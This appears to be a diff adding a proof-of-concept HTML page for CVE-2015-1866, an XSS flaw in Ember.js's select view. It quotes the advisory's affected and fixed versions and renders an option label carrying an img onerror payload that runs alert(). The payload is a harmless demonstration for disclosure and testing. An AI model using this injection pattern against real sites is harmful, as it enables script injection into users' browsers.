@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Ember bypass via view 'select'</title>
+</head>
+
+<body>
+    <br>This bypass was reported by Phillip Haines of Zestia.
+    <br>
+    <br>[CVE-2015-1866] Ember.js XSS Vulnerability With {{view "select"}} Options
+    <br>
+    <br>Data passed as the label of select options may not be escaped before being passed to the browser.
+    <br>
+    <br>* Versions Affected: 1.10.0, 1.11.0, 1.11.1, 1.12.0 beta
+    <br>* Not affected: Versions prior to 1.10.0
+    <br>* Fixed Versions: 1.10.1, 1.11.2
+    <br>
+    <br>
+
+    <script type="text/x-handlebars" data-template-name="bypass">
+        {{view 'select' content=data optionLabelPath='content.name'}}
+    </script>
+
+    <script type="text/javascript" src="http://code.jquery.com/jquery-1.11.2.js"></script>
+    <script type="text/javascript" src="http://builds.emberjs.com/tags/v1.11.0/ember-template-compiler.js"></script>
+    <!--<script type="text/javascript" src="http://builds.emberjs.com/tags/v1.12.0-beta.1/ember-template-compiler.js"></script>-->
+
+    <script type="text/javascript" src="http://builds.emberjs.com/tags/v1.11.0/ember.debug.js"></script>
+    <!--<script type="text/javascript" src="http://builds.emberjs.com/tags/v1.12.0-beta.1/ember.debug.js"></script>-->
+    <!--<script type="text/javascript" src="http://builds.emberjs.com/tags/v1.11.0/ember.prod.js"></script>-->
+    <!--<script type="text/javascript" src="http://builds.emberjs.com/tags/v1.11.0/ember.js"></script>-->
+
+    <script>
+        App = Ember.Application.create();
+
+        App.Router.map(function() {
+            this.route('bypass', {path: "/"});
+        });
+
+        App.BypassController = Ember.ArrayController.extend({
+            data: [
+                { name : "Error masking input in view select directive \<img src=x onerror=\"alert('masking failure, sandbox bypassed')\">" }
+            ]
+        });
+    </script>
+</body>
+
+</html>
